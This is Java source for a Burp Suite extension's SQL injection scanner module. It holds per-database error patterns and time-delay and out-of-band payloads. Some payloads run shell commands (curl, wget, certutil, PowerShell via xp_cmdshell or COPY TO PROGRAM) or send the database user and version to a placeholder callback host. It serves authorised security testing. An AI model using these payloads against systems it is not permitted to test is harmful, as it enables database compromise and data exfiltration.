package com.omnistrike.modules.injection;
import com.omnistrike.framework.stepper.StepperHttp;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.Interaction;
import burp.api.montoya.collaborator.InteractionType;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.omnistrike.framework.CollaboratorManager;
import com.omnistrike.framework.DeduplicationStore;
import com.omnistrike.framework.FindingsStore;
import com.omnistrike.framework.JsonScanSupport;
import com.omnistrike.framework.PayloadEncoder;
import com.omnistrike.framework.ResponseGuard;
import com.omnistrike.framework.ScanTargetIdentity;
import com.omnistrike.framework.TimingLock;

import com.omnistrike.model.*;

import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * MODULE 5: Smart SQLi Detector
 * Comprehensive SQL injection detection covering error-based (via DBMS
 * fingerprinting probes), union-based, time-based blind, and OOB
 * (Burp Collaborator) techniques. Phases: baseline, DBMS fingerprint /
 * error-based, OOB, union-based, time-based blind — each detection
 * technique has a configurable toggle.
 */
public class SmartSqliDetector implements ScanModule {

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;
    private CollaboratorManager collaboratorManager;

    // Tested parameters tracking
    private final ConcurrentHashMap<String, Boolean> tested = new ConcurrentHashMap<>();
    // Parameters confirmed exploitable via OOB — skip all remaining phases for these
    private final Set<String> oobConfirmedTargets = ConcurrentHashMap.newKeySet();

    // DBMS fingerprint cache: fully scoped injection target → detected DBMS
    // (empty string = inconclusive)
    private final ConcurrentHashMap<String, String> fingerprintCache = new ConcurrentHashMap<>();
    private final ConcurrentHashMap<String, CountDownLatch> fingerprintLatches = new ConcurrentHashMap<>();

    // SQL error patterns by DB type
    private static final Map<String, List<Pattern>> ERROR_PATTERNS = new LinkedHashMap<>();

    static {
        ERROR_PATTERNS.put("MySQL", List.of(
                Pattern.compile("SQL syntax.*?MySQL", Pattern.CASE_INSENSITIVE),
                Pattern.compile("mysql_fetch", Pattern.CASE_INSENSITIVE),
                Pattern.compile("mysql_num_rows", Pattern.CASE_INSENSITIVE),
                Pattern.compile("MySQL server version", Pattern.CASE_INSENSITIVE),
                Pattern.compile("mysqli_", Pattern.CASE_INSENSITIVE),
                Pattern.compile("You have an error in your SQL syntax", Pattern.CASE_INSENSITIVE),
                Pattern.compile("MariaDB server version", Pattern.CASE_INSENSITIVE)
        ));
        ERROR_PATTERNS.put("PostgreSQL", List.of(
                Pattern.compile("PostgreSQL.*?ERROR", Pattern.CASE_INSENSITIVE),
                Pattern.compile("pg_query", Pattern.CASE_INSENSITIVE),
                Pattern.compile("pg_exec", Pattern.CASE_INSENSITIVE),
                Pattern.compile("valid PostgreSQL result", Pattern.CASE_INSENSITIVE),
                Pattern.compile("unterminated quoted string", Pattern.CASE_INSENSITIVE),
                Pattern.compile("PSQLException", Pattern.CASE_INSENSITIVE)
        ));
        ERROR_PATTERNS.put("MSSQL", List.of(
                Pattern.compile("Microsoft SQL", Pattern.CASE_INSENSITIVE),
                Pattern.compile("ODBC SQL Server", Pattern.CASE_INSENSITIVE),
                Pattern.compile("SQLServer JDBC", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Unclosed quotation mark", Pattern.CASE_INSENSITIVE),
                Pattern.compile("mssql_query", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Microsoft OLE DB Provider", Pattern.CASE_INSENSITIVE)
        ));
        ERROR_PATTERNS.put("Oracle", List.of(
                Pattern.compile("ORA-\\d{5}", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Oracle error", Pattern.CASE_INSENSITIVE),
                Pattern.compile("quoted string not properly terminated", Pattern.CASE_INSENSITIVE),
                Pattern.compile("oracle\\.jdbc", Pattern.CASE_INSENSITIVE)
        ));
        ERROR_PATTERNS.put("SQLite", List.of(
                Pattern.compile("SQLite.*?error", Pattern.CASE_INSENSITIVE),
                Pattern.compile("sqlite3\\.OperationalError", Pattern.CASE_INSENSITIVE),
                Pattern.compile("SQLITE_ERROR", Pattern.CASE_INSENSITIVE),
                Pattern.compile("(?:SQLite|sqlite3?).*?unrecognized token|unrecognized token.*?near\\s+\"", Pattern.CASE_INSENSITIVE)
        ));
        ERROR_PATTERNS.put("DB2", List.of(
                Pattern.compile("DB2 SQL error", Pattern.CASE_INSENSITIVE),
                Pattern.compile("SQLCODE=-\\d+", Pattern.CASE_INSENSITIVE),
                Pattern.compile("com\\.ibm\\.db2", Pattern.CASE_INSENSITIVE),
                Pattern.compile("CLI Driver.*?DB2", Pattern.CASE_INSENSITIVE)
        ));
        ERROR_PATTERNS.put("Sybase", List.of(
                Pattern.compile("Sybase message", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Adaptive Server Enterprise", Pattern.CASE_INSENSITIVE),
                Pattern.compile("sybsystemprocs", Pattern.CASE_INSENSITIVE)
        ));
        ERROR_PATTERNS.put("Informix", List.of(
                Pattern.compile("com\\.informix\\.jdbc", Pattern.CASE_INSENSITIVE),
                Pattern.compile("INFORMIX-SQL", Pattern.CASE_INSENSITIVE),
                Pattern.compile("ifx_", Pattern.CASE_INSENSITIVE)
        ));
        ERROR_PATTERNS.put("Firebird", List.of(
                Pattern.compile("Dynamic SQL Error", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Firebird.*?error", Pattern.CASE_INSENSITIVE),
                Pattern.compile("isc_dsql_error", Pattern.CASE_INSENSITIVE)
        ));
        ERROR_PATTERNS.put("CockroachDB", List.of(
                Pattern.compile("cockroach.*?error", Pattern.CASE_INSENSITIVE),
                Pattern.compile("\\bCRDB\\b.*?(?:error|panic|internal|syntax)", Pattern.CASE_INSENSITIVE)
        ));
        // Generic patterns — only include SQL-specific ones; removed OperationalError, DatabaseError,
        // ProgrammingError, DataError, IntegrityError, division by zero (too generic, match non-SQL errors)
        ERROR_PATTERNS.put("Generic", List.of(
                Pattern.compile("syntax error.*?SQL", Pattern.CASE_INSENSITIVE),
                Pattern.compile("unexpected end of SQL", Pattern.CASE_INSENSITIVE),
                Pattern.compile("SQLSTATE\\[", Pattern.CASE_INSENSITIVE),
                // Tightened: require SQL function prefix to avoid matching "Warning: your query returned no results"
                Pattern.compile("Warning.*?\\b(mysql_|mysqli_|pg_|oci_|sqlsrv_|num_rows|fetch_array|fetch_assoc|fetch_row)\\b", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Syntax error or access violation", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Unclosed quotation mark", Pattern.CASE_INSENSITIVE),
                Pattern.compile("quoted string not properly terminated", Pattern.CASE_INSENSITIVE),
                Pattern.compile("SQL command not properly ended", Pattern.CASE_INSENSITIVE),
                Pattern.compile("invalid input syntax for", Pattern.CASE_INSENSITIVE),
                Pattern.compile("near \".*?\": syntax error", Pattern.CASE_INSENSITIVE),
                Pattern.compile("PDOException", Pattern.CASE_INSENSITIVE),
                Pattern.compile("java\\.sql\\.SQLException", Pattern.CASE_INSENSITIVE),
                Pattern.compile("System\\.Data\\.SqlClient", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Npgsql\\.PostgresException", Pattern.CASE_INSENSITIVE),
                Pattern.compile("org\\.hibernate\\.(?:exception|SQLQuery|QueryException|JDBCException)", Pattern.CASE_INSENSITIVE),
                Pattern.compile("jdbc\\.SQLServerException", Pattern.CASE_INSENSITIVE),
                Pattern.compile("(?:sql|syntax|query|statement).*?\\bSQLException\\b|\\bSQLException\\b.*?(?:syntax|query|statement)", Pattern.CASE_INSENSITIVE),
                Pattern.compile("supplied argument is not a valid", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Column count doesn't match", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Unknown column '.*?' in '(?:field list|where clause|on clause|order clause)'", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Table .* doesn't exist", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Data truncated for column", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Duplicate entry '.*?' for key", Pattern.CASE_INSENSITIVE)
        ));
    }

    // OOB payloads by DB type (use COLLAB_PLACEHOLDER for Collaborator domain)
    private static final Map<String, String[]> OOB_PAYLOADS;
    static {
        Map<String, String[]> oob = new LinkedHashMap<>();
        oob.put("MySQL", new String[]{
                // LOAD_FILE with UNC path — single-quote string context
                "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\','COLLAB_PLACEHOLDER','\\\\a'))-- -",
                "' AND LOAD_FILE(CONCAT('\\\\\\\\','COLLAB_PLACEHOLDER','\\\\a'))-- -",
                // Double-quote context
                "\" UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\','COLLAB_PLACEHOLDER','\\\\a'))-- -",
                "\" AND LOAD_FILE(CONCAT('\\\\\\\\','COLLAB_PLACEHOLDER','\\\\a'))-- -",
                // Data exfil: version + user in subdomain
                "1' UNION SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,(SELECT version()),0x2e,'COLLAB_PLACEHOLDER',0x5c5c61))-- -",
                "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',REPLACE(user(),CHAR(64),CHAR(46)),'.','COLLAB_PLACEHOLDER','\\\\a'))-- -",
                // LOAD_FILE via hex-encoded path (WAF bypass)
                "' UNION SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,'COLLAB_PLACEHOLDER',0x5c61))-- -",
                "' AND LOAD_FILE(CONCAT(CHAR(92,92),(SELECT version()),CHAR(46),'COLLAB_PLACEHOLDER',CHAR(92,97)))-- -",
                // XML error functions wrapping LOAD_FILE
                "' AND extractvalue(1,concat(0x7e,(SELECT LOAD_FILE(CONCAT('\\\\\\\\','COLLAB_PLACEHOLDER','\\\\a')))))-- -",
                "' AND updatexml(1,concat(0x7e,(SELECT LOAD_FILE(CONCAT('\\\\\\\\','COLLAB_PLACEHOLDER','\\\\a')))),1)-- -",
                // LOAD_FILE via SET @var — avoids string concatenation detection
                "'; SET @q=CONCAT('\\\\\\\\','COLLAB_PLACEHOLDER','\\\\a'); SELECT LOAD_FILE(@q)-- -",
                // Subquery-wrapped — numeric context
                "1 AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\','COLLAB_PLACEHOLDER','\\\\a'))) IS NOT NULL-- -",
                "1 OR (SELECT LOAD_FILE(CONCAT('\\\\\\\\','COLLAB_PLACEHOLDER','\\\\a'))) IS NOT NULL-- -",
                "1 AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT user()),'.','COLLAB_PLACEHOLDER','\\\\a'))) IS NOT NULL-- -",
                // Integer injection — no quotes
                "(SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,'COLLAB_PLACEHOLDER',0x5c5c61)))",
        });
        oob.put("MSSQL", new String[]{
                // xp_dirtree (most common, enabled by default)
                "'; EXEC master..xp_dirtree '\\\\COLLAB_PLACEHOLDER\\a'-- -",
                "'; DECLARE @q VARCHAR(1024);SET @q='\\\\COLLAB_PLACEHOLDER\\a';EXEC master..xp_dirtree @q-- -",
                // xp_subdirs
                "' UNION SELECT 1; EXEC master..xp_subdirs '\\\\COLLAB_PLACEHOLDER\\a'-- -",
                // xp_fileexist
                "'; EXEC master..xp_fileexist '\\\\COLLAB_PLACEHOLDER\\a'-- -",
                // xp_cmdshell (if enabled)
                "'; EXEC xp_cmdshell 'nslookup COLLAB_PLACEHOLDER'-- -",
                "'; EXEC xp_cmdshell 'ping -n 1 COLLAB_PLACEHOLDER'-- -",
                // xp_cmdshell with HTTP callbacks (curl/certutil)
                "'; EXEC xp_cmdshell 'curl http://COLLAB_PLACEHOLDER/'-- -",
                "'; EXEC xp_cmdshell 'certutil -urlcache -split -f http://COLLAB_PLACEHOLDER/ %temp%\\a'-- -",
                "'; EXEC xp_cmdshell 'powershell Invoke-WebRequest http://COLLAB_PLACEHOLDER/'-- -",
                // fn_xe_file_target_read_file / bulk insert
                "'; DECLARE @q VARCHAR(1024);SET @q='\\\\COLLAB_PLACEHOLDER\\a';EXEC master.dbo.xp_dirtree @q,1,1-- -",
                // OPENROWSET
                "'; SELECT * FROM OPENROWSET('SQLOLEDB','server=COLLAB_PLACEHOLDER;uid=sa;pwd=sa','SELECT 1')-- -",
                // sp_OACreate + WScript.Shell (alternative OOB)
                "'; DECLARE @o INT;EXEC sp_OACreate 'WScript.Shell',@o OUT;EXEC sp_OAMethod @o,'Run','','nslookup COLLAB_PLACEHOLDER'-- -",
                // BULK INSERT from UNC path
                // fn_get_audit_file UNC read
                "'; SELECT * FROM sys.fn_get_audit_file('\\\\COLLAB_PLACEHOLDER\\a',DEFAULT,DEFAULT)-- -",
                // OPENROWSET BULK UNC
                "'; SELECT * FROM OPENROWSET(BULK '\\\\COLLAB_PLACEHOLDER\\a', SINGLE_CLOB) AS x-- -",
                // xp_cmdshell with data exfil (hostname in subdomain)
                "'; EXEC xp_cmdshell 'nslookup %COMPUTERNAME%.COLLAB_PLACEHOLDER'-- -",
                // Linked server OOB
                // Subquery-wrapped — numeric context
                "1 AND (SELECT 1 FROM OPENROWSET('SQLOLEDB','server=COLLAB_PLACEHOLDER;uid=sa;pwd=sa','SELECT 1')) IS NOT NULL-- -",
                "1 AND (SELECT TOP 1 1 FROM master..sysprocesses WHERE 1=1);EXEC master..xp_dirtree '\\\\COLLAB_PLACEHOLDER\\a'-- -",
                // Subquery-wrapped — no quotes (integer injection)
                "(SELECT 1 WHERE 1=1);EXEC master..xp_dirtree '\\\\COLLAB_PLACEHOLDER\\a'-- -",
                // Inline subquery with OPENROWSET
                "1 UNION SELECT 1 FROM OPENROWSET('SQLOLEDB','server=COLLAB_PLACEHOLDER;uid=sa;pwd=sa','SELECT 1')-- -",
        });
        oob.put("Oracle", new String[]{
                // UTL_INADDR (DNS lookup) — string context
                "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS('COLLAB_PLACEHOLDER'))||'",
                "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('COLLAB_PLACEHOLDER')-- -",
                // UTL_HTTP (HTTP request) — string context
                "'||(SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/') FROM DUAL)||'",
                "' AND 1=(SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/') FROM DUAL)-- -",
                // HTTPURITYPE — string context
                "'||(SELECT HTTPURITYPE('http://COLLAB_PLACEHOLDER/').GETCLOB() FROM DUAL)||'",
                // DBMS_LDAP (LDAP connection)
                "'||(SELECT DBMS_LDAP.INIT('COLLAB_PLACEHOLDER',80) FROM DUAL)||'",
                // SYS.DBMS_LDAP.INIT with data exfil in LDAP path
                "'||(SELECT SYS.DBMS_LDAP.INIT((SELECT user FROM DUAL)||'.'||'COLLAB_PLACEHOLDER',80) FROM DUAL)||'",
                // UTL_TCP (TCP connection)
                "' AND 1=(SELECT UTL_TCP.OPEN_CONNECTION('COLLAB_PLACEHOLDER',80) FROM DUAL)-- -",
                // XXE via XMLType
                "' AND 1=(SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://COLLAB_PLACEHOLDER/\">%remote;]>'),'/l') FROM DUAL)-- -",
                // DBMS_XMLGEN
                "' UNION SELECT DBMS_XMLGEN.getxml('SELECT UTL_INADDR.GET_HOST_ADDRESS(''COLLAB_PLACEHOLDER'') FROM DUAL') FROM DUAL-- -",
                // DBMS_SCHEDULER job creation with HTTP callback
                // UTL_FILE write to UNC (Windows Oracle)
                // DBMS_XMLQUERY (older Oracle versions)
                "'||(SELECT DBMS_XMLQUERY.getxml('SELECT UTL_INADDR.GET_HOST_ADDRESS(''COLLAB_PLACEHOLDER'') FROM DUAL') FROM DUAL)||'",
                // UTL_HTTP with data exfil (user in path)
                "'||(SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/'||(SELECT user FROM DUAL)) FROM DUAL)||'",
                // Subquery-wrapped — numeric context (WHERE id=1 AND (...) IS NOT NULL)
                "1 AND (SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/'||(SELECT user FROM DUAL)) FROM DUAL) IS NOT NULL-- -",
                "1 AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM DUAL)||'.COLLAB_PLACEHOLDER') FROM DUAL) IS NOT NULL-- -",
                "1 AND (SELECT HTTPURITYPE('http://COLLAB_PLACEHOLDER/').GETCLOB() FROM DUAL) IS NOT NULL-- -",
                "1 AND (SELECT DBMS_LDAP.INIT((SELECT user FROM DUAL)||'.COLLAB_PLACEHOLDER',80) FROM DUAL) IS NOT NULL-- -",
                "1 AND (SELECT UTL_TCP.OPEN_CONNECTION('COLLAB_PLACEHOLDER',80) FROM DUAL) IS NOT NULL-- -",
                "1 OR (SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/') FROM DUAL) IS NOT NULL-- -",
                // Subquery-wrapped — no quotes (integer injection point)
                "(SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/'||(SELECT user FROM DUAL)) FROM DUAL)",
                "(SELECT UTL_INADDR.GET_HOST_ADDRESS('COLLAB_PLACEHOLDER') FROM DUAL)",
                "(SELECT HTTPURITYPE('http://COLLAB_PLACEHOLDER/').GETCLOB() FROM DUAL)",
                "(SELECT DBMS_LDAP.INIT('COLLAB_PLACEHOLDER',80) FROM DUAL)",
                // Double-pipe concatenation for numeric context
                "1||(SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/') FROM DUAL)",
                "1||(SELECT UTL_INADDR.GET_HOST_ADDRESS('COLLAB_PLACEHOLDER') FROM DUAL)",
        });
        oob.put("PostgreSQL", new String[]{
                // COPY TO PROGRAM (superuser)
                "'; COPY (SELECT '') TO PROGRAM 'nslookup COLLAB_PLACEHOLDER'-- -",
                "'; COPY (SELECT '') TO PROGRAM 'curl http://COLLAB_PLACEHOLDER/'-- -",
                "'; COPY (SELECT '') TO PROGRAM 'wget http://COLLAB_PLACEHOLDER/'-- -",
                // COPY FROM PROGRAM (reverse direction — reads output)
                // dblink_connect (if extension installed) — string context
                "'||(SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'))||'",
                "' AND 1=(SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'))-- -",
                // dblink_connect with data exfil (version in host)
                "'||(SELECT dblink_connect('host='||(SELECT version())||'.COLLAB_PLACEHOLDER dbname=a'))||'",
                // dblink_send_query (async variant)
                "'; SELECT dblink_send_query('host=COLLAB_PLACEHOLDER dbname=a','SELECT 1')-- -",
                // Large object export (lo_export + COPY)
                "'; SELECT lo_export(lo_creat(-1), '\\\\COLLAB_PLACEHOLDER\\a')-- -",
                // DNS via inet_client_addr
                "'; DO $$ BEGIN PERFORM dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'); EXCEPTION WHEN OTHERS THEN END $$-- -",
                // PG extensions - xml
                "'; SELECT query_to_xml('SELECT 1',true,true,'http://COLLAB_PLACEHOLDER/')-- -",
                // pg_read_server_log_file via dblink to trigger DNS
                "'; DO $$ BEGIN PERFORM dblink('host=COLLAB_PLACEHOLDER dbname=a','SELECT pg_ls_dir(''/tmp'')'); EXCEPTION WHEN OTHERS THEN END $$-- -",
                // Subquery-wrapped — numeric context
                "1 AND (SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a')) IS NOT NULL-- -",
                "1 AND (SELECT dblink_connect('host='||(SELECT current_user)||'.COLLAB_PLACEHOLDER dbname=a')) IS NOT NULL-- -",
                "1 OR (SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a')) IS NOT NULL-- -",
                // Subquery-wrapped — no quotes (integer injection)
                "(SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'))",
                "(SELECT dblink_connect('host='||(SELECT current_user)||'.COLLAB_PLACEHOLDER dbname=a'))",
                // query_to_xml subquery-wrapped
                "1 AND (SELECT query_to_xml('SELECT 1',true,true,'http://COLLAB_PLACEHOLDER/')) IS NOT NULL-- -",
        });
        oob.put("SQLite", new String[]{
                // SQLite doesn't have native OOB, but ATTACH can be used
                "'; ATTACH DATABASE '\\\\COLLAB_PLACEHOLDER\\a' AS loot-- -",
                // Load extension (if enabled)
                "'; SELECT load_extension('\\\\COLLAB_PLACEHOLDER\\a')-- -",
                // Subquery-wrapped — numeric context
                "1 AND (SELECT load_extension('\\\\COLLAB_PLACEHOLDER\\a')) IS NOT NULL-- -",
                "1;ATTACH DATABASE '\\\\COLLAB_PLACEHOLDER\\a' AS loot-- -",
        });
        OOB_PAYLOADS = Collections.unmodifiableMap(oob);
    }

    // Time-based payloads — ~10 per DBMS, 5-second delay
    private static final Map<String, String[]> TIME_PAYLOADS;
    static {
        Map<String, String[]> tp = new LinkedHashMap<>();
        tp.put("MySQL", new String[]{
                "' AND SLEEP(5)-- -",
                "1' AND SLEEP(5)-- -",
                "\" AND SLEEP(5)-- -",
                "1 AND SLEEP(5)-- -",
                "' AND IF(1=1,SLEEP(5),0)-- -",
                "1' AND IF(1=1,SLEEP(5),0)-- -",
                "' AND (SELECT SLEEP(5))-- -",
                "1' AND (SELECT SLEEP(5))-- -",
                "') AND SLEEP(5)-- -",
                "' AND BENCHMARK(10000000,SHA1('x'))-- -",
        });
        tp.put("PostgreSQL", new String[]{
                "'; SELECT PG_SLEEP(5)-- -",
                "1'; SELECT PG_SLEEP(5)-- -",
                "' AND (SELECT PG_SLEEP(5)) IS NOT NULL-- -",
                "1' AND (SELECT PG_SLEEP(5)) IS NOT NULL-- -",
                "'||(SELECT PG_SLEEP(5))-- -",
                "' AND CASE WHEN 1=1 THEN (SELECT PG_SLEEP(5)) END IS NOT NULL-- -",
                "1 AND (SELECT PG_SLEEP(5)) IS NOT NULL-- -",
                "'); SELECT PG_SLEEP(5)-- -",
                "\" AND (SELECT PG_SLEEP(5)) IS NOT NULL-- -",
                "1; SELECT PG_SLEEP(5)-- -",
        });
        tp.put("MSSQL", new String[]{
                "'; WAITFOR DELAY '0:0:5'-- -",
                "1'; WAITFOR DELAY '0:0:5'-- -",
                "\"; WAITFOR DELAY '0:0:5'-- -",
                "1; WAITFOR DELAY '0:0:5'-- -",
                "'; IF(1=1) WAITFOR DELAY '0:0:5'-- -",
                "1'; IF(1=1) WAITFOR DELAY '0:0:5'-- -",
                "'); WAITFOR DELAY '0:0:5'-- -",
                "' WAITFOR DELAY '0:0:5'-- -",
                "')); WAITFOR DELAY '0:0:5'-- -",
                "'; IF 1=1 WAITFOR DELAY '0:0:5'-- -",
        });
        tp.put("Oracle", new String[]{
                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
                "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
                "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
                "'||(SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM DUAL)||'",
                "' AND CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END=1-- -",
                "1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
                "1||(SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM DUAL)",
                "'; BEGIN DBMS_LOCK.SLEEP(5); END;-- -",
                "'; BEGIN DBMS_SESSION.SLEEP(5); END;-- -",
                "(SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM DUAL)",
        });
        // SQLite has no native sleep primitive. RANDOMBLOB-based substitutes
        // allocate hundreds of MB and can DoS the database, so they are omitted.
        TIME_PAYLOADS = Collections.unmodifiableMap(tp);
    }


    // Lightweight DBMS fingerprint probes — sent before the main payload battery
    private static final String[] FINGERPRINT_PROBES = {
            "'",                                                     // Universal — triggers DB-specific error messages
            "1 AND 1=CONVERT(int,@@version)-- -",                    // MSSQL
            "' AND 1=1::int-- -",                                    // PostgreSQL
            "' AND extractvalue(1,1)-- -",                           // MySQL
            "' AND 1=UTL_INADDR.GET_HOST_NAME('localhost')-- -",     // Oracle
            "' AND sqlite_version() IS NOT NULL-- -",                // SQLite
    };

    @Override
    public String getId() { return "sqli-detector"; }

    @Override
    public String getName() { return "Smart SQLi Detector"; }

    @Override
    public String getDescription() {
        return "SQL injection detection: error-based, union-based, time-blind, and OOB (Collaborator).";
    }

    @Override
    public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }

    @Override
    public boolean isPassive() { return false; }

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    /**
     * Inject external dependencies from the framework.
     */
    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                 CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        this.collaboratorManager = collaboratorManager;
    }

    @Override
    public List<Finding> processHttpFlowForParameter(
            HttpRequestResponse requestResponse, String targetParameterName, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());
        List<InjectionPoint> injectionPoints = extractInjectionPoints(request);
        injectionPoints.removeIf(ip -> !ip.matchesParameterName(targetParameterName));
        return runInjectionPoints(requestResponse, injectionPoints, urlPath);
    }

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        // Extract parameters from the request
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());
        List<InjectionPoint> injectionPoints = extractInjectionPoints(request);
        return runInjectionPoints(requestResponse, injectionPoints, urlPath);
    }

    private List<Finding> runInjectionPoints(HttpRequestResponse requestResponse,
                                              List<InjectionPoint> injectionPoints, String urlPath) {
        for (InjectionPoint ip : injectionPoints) {
            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return Collections.emptyList();
            String dedupKey = "sqli:" + scanTargetKey(requestResponse.request(), ip);
            // Atomic mark-before-test: putIfAbsent returns null only on first caller,
            // preventing both the TOCTOU race (containsKey/put) and the retry-on-exception
            // bug (parameter retested forever if testParameter throws).
            // Manual (right-click) scans set the shared dedup bypass on this thread —
            // honor it so an explicit re-scan actually re-tests the parameter.
            boolean manualBypass = dedup != null && dedup.isBypass();
            if (!manualBypass
                    && !com.omnistrike.framework.BoundedDeduplication.markIfNew(tested, dedupKey)) continue;

            try {
                testParameter(requestResponse, ip, urlPath);
            } catch (Exception e) {
                api.logging().logToError("SQLi test error on " + ip.name + ": " + e.getMessage());
            }
        }

        return Collections.emptyList(); // Findings are added async to FindingsStore
    }

    private void testParameter(HttpRequestResponse original, InjectionPoint ip, String urlPath) {
        try {
            // Phase 1: Baseline
            HttpRequestResponse baseline = sendWithPayload(original, ip, ip.originalValue);
            if (baseline == null || baseline.response() == null) return;

            String baselineBody = baseline.response().bodyToString();
            if (baselineBody == null) baselineBody = "";
            int baselineLength = baselineBody.length();
            int baselineStatus = baseline.response().statusCode();

            // Phase 2: DBMS Fingerprint — identify backend DB to filter OOB/UNION payloads
            String detectedDbms = null;
            if (config.getBool("sqli.fingerprint.enabled", true)) {
                detectedDbms = fingerprintDbms(original, ip, urlPath, baselineBody);
            }

            boolean oobAvailable = config.getBool("sqli.oob.enabled", true)
                    && collaboratorManager != null && collaboratorManager.isAvailable();

            // Phase 3: compact OOB canary stage. Remaining variants are deferred
            // until direct UNION and boolean checks fail.
            if (oobAvailable) {
                testOob(original, ip, detectedDbms, true);
            }

            // Phase 4: Union-based
            if (isOobConfirmed(original, ip)) return;
            if (config.getBool("sqli.union.enabled", true)) {
                if (testUnionBased(original, ip, baselineLength, baselineStatus, baselineBody)) return;
            }

            // Phase 4b: conservative boolean differential detection.
            if (config.getBool("sqli.boolean.enabled", true)
                    && testBooleanBased(original, ip, baseline)) {
                return;
            }

            // Direct confirmation failed: finish uncommon DB-specific OOB variants.
            if (isOobConfirmed(original, ip)) return;
            if (oobAvailable) {
                testOob(original, ip, detectedDbms, false);
            }

            // Phase 5: Time-based blind (serialized via TimingLock to avoid false positives)
            if (isOobConfirmed(original, ip)) return;
            if (TimingLock.isEnabled() && config.getBool("sqli.time.enabled", false)) {
                try {
                    TimingLock.acquire();
                    testTimeBased(original, ip, detectedDbms);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    return;
                } finally {
                    TimingLock.release();
                }
            }

        } catch (Exception e) {
            api.logging().logToError("SQLi test error for " + ip.name + ": " + e.getMessage());
        }
    }


    // ==================== PHASE 3: UNION-BASED ====================

    private boolean testUnionBased(HttpRequestResponse original, InjectionPoint ip,
                                 int baselineLength, int baselineStatus, String baselineBody) {
        int maxColumns = config.getInt("sqli.union.maxColumns", 30);
        int anomalyThreshold = config.getInt("sqli.union.anomalyThreshold", 50);

        // Step 1: Detect column count via ORDER BY
        int columnCount = -1;
        String quoteChar = "'";

        for (String q : new String[]{"'", "\"", ""}) {
            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;
            int lastGood = 0;
            for (int i = 1; i <= maxColumns; i++) {
                if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;
                try {

                    String payload = q.isEmpty()
                            ? ip.originalValue + " ORDER BY " + i + "-- -"
                            : ip.originalValue + q + " ORDER BY " + i + "-- -";

                    HttpRequestResponse result = sendWithPayload(original, ip, payload);
                    if (result == null || result.response() == null) break;
                    if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); continue; }

                    int status = result.response().statusCode();
                    String _body = result.response().bodyToString();
                    if (_body == null) _body = "";
                    int length = _body.length();

                    if (status == baselineStatus && Math.abs(length - baselineLength) < anomalyThreshold) {
                        lastGood = i;
